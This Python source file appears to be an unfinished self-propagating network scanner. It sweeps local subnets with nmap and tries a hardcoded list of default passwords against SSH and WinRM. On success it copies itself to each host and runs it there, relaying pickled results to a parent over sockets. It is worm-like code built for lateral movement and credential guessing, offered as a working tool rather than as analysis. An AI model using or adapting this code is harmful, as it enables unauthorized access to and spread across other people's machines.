import base64
import argparse
import pickle
import netifaces as ni
import nmap
import time
import socket
import threading
import paramiko
import requests
from scp import SCPClient
from winrmcp import Client as WinClient
from pypsexec.client import Client as ps_client
import winrm
# TODO: Remove unneeded imports
BIND_PORT = 9000
BIND_ADDR = ('0.0.0.0', BIND_PORT)
# List of new hosts found on the scan
new_hosts = {}
my_data = {}

creds = []
creds.append({'user': 'yos', 'pass': 'bos'})
creds.append({'user': 'kali', 'pass': 'kali'})
creds.append({'user': 'User', 'pass': 'Matan1245'})
creds.append({'user': 'Administrator', 'pass': '123456'})


class Host:
    def __init__(self, ip, mac=None, os=None) -> None:
        self.ip = ip
        self.mac = mac
        self.os = os


def get_args():  # TODO: Verify this is positional and must + have help
    # Getting args: sm_ip, sm_port
    parser = argparse.ArgumentParser()
    parser.add_argument('parent_ip', type=str,
                        help='Parent ip address')
    parser.add_argument('parent_port', type=int,
                        help='Parent port')
    parser.add_argument('--relay', '-r',
                        action='store_true',
                        help='relay data back to parent',
                        )
    # options = parser.parse_args()
    options = parser.parse_args(['127.0.0.1', '9000'])

    # Quit the program if the argument is missing
    if not options.parent_ip or not options.parent_port:
        # Code to handle if interface is not specified
        parser.error(
            "[-] Please specify an IP Address or Addresses, use --help for more info.")
    return options


class Communicator():

    def __init__(self, sm_ip, sm_port) -> None:
        self.sm_ip = sm_ip
        self.sm_port = sm_port

    def init_relay(self) -> None:
        # Start comunication sockets
        fail = True
        while fail:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(BIND_ADDR)
                # TODO: Verify best number, so that we wont lose connections
                s.listen(100)
                t_hi = threading.Thread(target=self.handle_inputs, args=(s,))
                t_hi.start()
                fail = False
            except socket.error as err:
                print(err)
            wait = 5
            print(
                f'Error setting up relay socket. trying again in {wait} seconds')
            time.sleep(wait)

    def handle_inputs(self, son_sock):
        while True:
            conn, addr = son_sock.accept()
            print(addr[0] + " connected")
            t_rr = threading.Thread(target=self.relay_results, args=(
                conn, addr))  # TODO: Verify syntax is correct
            t_rr.start()

    def send_results(self, results):
        # TODO: Create protocol to send all the data. currently - IP, MAC, OS
        # TODO: Verify success
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # TODO: Verify success
            s.connect((self.sm_ip, self.sm_port))
            s.send(pickle.dumps(results))
            s.close()
        except socket.error as err:
            print('error:', err)

    # Open socket at same port as the scan manager, receive packet and relay it back to scan manager
    def relay_results(self, conn, addr):  # inside thread
        # TODO: Verify success
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.sm_ip, self.sm_port))
            while True:
                data = conn.recv(1024)
                if data and data != b'':
                    s.send(data)
                else:
                    break
        except socket.error as err:
            print('error:', err)

    def close_all(self):
        self.s.close()


# FROM Here: Scanner --------------------------------------------------------------------------------------------------------------
class NmapScanner():
    def __init__(self) -> None:
        # TODO: get best ports or how to use nmap defaults
        default_ports = [80, 445, 443, 135, 139, 22, 21, 23]
        self.scanner = nmap.PortScanner()

    def os_detection(self, hosts):
        s = nmap.PortScanner()
        hostlist = ' '.join(new_hosts.keys())
        if hostlist:
            print('hostlist join:', hostlist)
            s.scan(hosts=hostlist, arguments='-O ')
            print('hostlist after scan:', s.all_hosts())
            for host in s.all_hosts():
                if s[host]['osmatch']:
                    print(s[host]['osmatch'][0]['osclass'][0]['osfamily'])
                    new_hosts[host].os = s[host]['osmatch'][0]['osclass'][0]['osfamily'].lower(
                    )

    def udpscan():
        pass

    def arp_pingsweep(self, ip):
        scanner = nmap.PortScanner()
        scanner.scan(hosts=ip + '/24', arguments='-PEPM -sn -n')
        allhosts = scanner.all_hosts()
        hosts_list = [(x, scanner[x]['status']['state'])
                      for x in allhosts]
        for host, status in hosts_list:
            new_hosts[host] = Host(scanner[host]['addresses']['ipv4'])
            try:
                new_hosts[host].mac = scanner[host]['addresses']['mac']
            except KeyError:
                # TODO: Generate mac, for now deleting
                del new_hosts[host]
                allhosts.remove(host)
            print(host, status)
        print('all hosts:', allhosts)
        return allhosts
        # self.os_detection(scanner.all_hosts())


class WinRMUtil:
    def __init__(self, session):
        self.session = session

    def upload_file(self, local_filename, remote_filename):
        file = open(local_filename, 'rt')
        text = file.read()
        text = text.replace('\n', '\r\n')
        file.close()
        self._create_remote_file(remote_filename, text)

    def _create_remote_file(self, remote_filename, text):
        step = 400
        utf8 = text.encode("utf8")
        rs = self.session.run_cmd(
            'powershell clear-content ' + remote_filename)
        for i in range(0, len(utf8), step):
            self._do_put_file(remote_filename, utf8[i:i + step])

    def _do_put_file(self, location, contents):
        # adapted/copied from https://github.com/diyan/pywinrm/issues/18
        p1 = """
$filePath = "{}"
$s = @"
{}
"@""".format(location, base64.b64encode(contents).decode('utf8'))

        p2 = """
$data = [System.Convert]::FromBase64String($s)
add-content -value $data -encoding byte -path $filePath
"""
        ps_script = p1 + p2
        encoded_ps = base64.b64encode(
            ps_script.encode('utf_16_le')).decode('utf8')
        rs = self.session.run_cmd(
            'powershell -encodedcommand {0}'.format(encoded_ps))
        if rs.status_code == 1:
            print(rs.std_err)
            return None
        return rs.std_out


class RemoteLogin():
    """
    This class manages the remote login and execution part.
    It recieves username password and server(ip address), and log in to the server with on of the following methods:
    SSH - if linux machine
    --- - if windows machine
    """

    def __init__(self, server, os=None) -> None:
        self.server = server
        self.os = os

    def check_port_open(self, port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex((self.server, port))
        if result == 0:
            return True
        else:
            return False

    def scan_host(self):
        # Check if port is open first
        status = False
        if self.check_port_open(BIND_PORT):
            print(f'{self.server}: port OPEN. Scan already in progress')
        else:
            print('port CLOSED')
            if self.os == 'linux':
                self.ssh()
            elif self.os == 'windows':
                self.windows()
            else:
                # Guess
                if self.check_port_open(22):
                    status = self.ssh()
                elif self.check_port_open(5985):
                    status = self.windows_winrm()
                else:
                    print(f'{self.server}: Could not run scanner')
        return status

    def ssh(self):
        curr_file_location = "networkscanner.py"
        remote_file_location = "networkscanner.py"
        scanner_exec_command = "python " + remote_file_location
        ssh_session = paramiko.SSHClient()
        ssh_session.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        logged_in = False
        for cred in creds:
            try:
                ssh_session.connect(self.server, 22,
                                    username=cred['user'], password=cred['pass'])
                logged_in = True
                break
            except paramiko.ssh_exception.AuthenticationException:
                pass
            except TimeoutError:
                pass
        if not logged_in:
            return False
        with SCPClient(ssh_session.get_transport()) as scp:
            scp.put(curr_file_location, remote_file_location)

        ssh_stdin, ssh_stdout, ssh_stderr = ssh_session.exec_command(
            scanner_exec_command)
        err = ssh_stderr.read().decode()
        if err:
            print("Failed to execute scanner script, error: " + err)
            return False
        else:
            print("Scanner script executed successfully!")
            return True
# 5985

    def windows_winrm(self):
        # try:
        scanner_path = "networkscanner.py"
        for cred in creds:
            try:
                s = winrm.Session(self.server,
                                  auth=(cred['user'], cred['pass']))
                util = WinRMUtil(s)
                util.upload_file(scanner_path,
                                 scanner_path)
                r = s.run_cmd('type ' + scanner_path,)
                print(r.std_out)
                # client = WinClient(self.server, auth=(
                #     cred['user'], cred['pass']))
                # client.copy(scanner_path, scanner_path)
                # c = ps_client(self.server, username=cred,
                #               password=creds[cred])
                # c.connect()
                # stdout, stderr, rc = c.run_executable("cmd.exe",
                #                                       arguments="python3 "+scanner_path)
                # c.remove_service()
                # c.disconnect()

                return True
            except requests.exceptions.ConnectionError as err:
                print(err)
                pass
            except winrm.exceptions.InvalidCredentialsError as err:
                print(err)
                pass
        return False


def get_local_ips():
    interfaces = ni.interfaces()
    local_ips = []
    for face in interfaces:
        try:
            ip = ni.ifaddresses(face)[ni.AF_INET][0]['addr']
            local_ips.append(ip)
            print(ip)
        except KeyError:
            print('badface', face)
    if '127.0.0.1' in local_ips:
        local_ips.remove('127.0.0.1')
    print(local_ips)
    return local_ips


def main():
    if False:
        args = get_args()
        communicator = Communicator(args.parent_ip, args.parent_port)
        if args.relay:
            communicator.init_relay()  # TODO: decide if used by args
        nmap_scanner = NmapScanner()
        # Start scanning
        local_ips = get_local_ips()
        my_data['ips'] = local_ips
        for ip in local_ips[3:4]:
            # TODO: in new thread
            hosts = nmap_scanner.arp_pingsweep(ip)
            # nmap_scanner.os_detection(hosts)

            # OPTIONAL: add information gathering commands

        # TODO: after threads -  Wait for all threads to finish
    new_hosts = {'192.168.1.65': Host(
        '192.168.1.65'), '192.168.1.66': Host('192.168.1.66')}
    # new_hosts = {}
    # Send results back
    my_data['hosts'] = new_hosts
    # communicator.send_results(my_data)

    for host in new_hosts:
        print(host)
        if new_hosts[host].os:
            remote = RemoteLogin(host, new_hosts[host].os)
        else:
            remote = RemoteLogin(host)
        remote.scan_host()


main()
